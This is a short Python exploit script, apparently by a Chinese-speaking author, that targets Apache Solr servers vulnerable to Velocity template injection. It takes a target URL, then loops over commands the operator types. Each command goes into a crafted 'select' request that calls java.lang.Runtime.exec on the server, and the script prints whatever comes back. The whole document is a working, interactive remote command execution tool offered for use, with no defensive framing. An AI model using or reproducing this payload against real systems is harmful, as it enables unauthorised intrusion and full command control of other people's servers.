import requests
from urllib.parse import quote
'''
	作者 : fzjzZZ
	作用 : 针对某个存在solr任意命令执行漏洞的网站进行利用
'''

url = input('[*]input url(eg:http://x.x.x.x/solr/sore/):')

while True:
	cmd = input('命令:')
	cmd_url = quote(cmd)
	payload = url + f'select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd_url}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end' 
	for i in range(2):
		try:
			restart = requests.get(payload,timeout = 5)
			break
		except:
			pass
	try:
		if restart.status_code != 500:
			res = restart.text
			print(f'[*]code"{cmd}"--restart\n{res}')
		else:
			print('命令未执行或无回显')
	except:
		pass

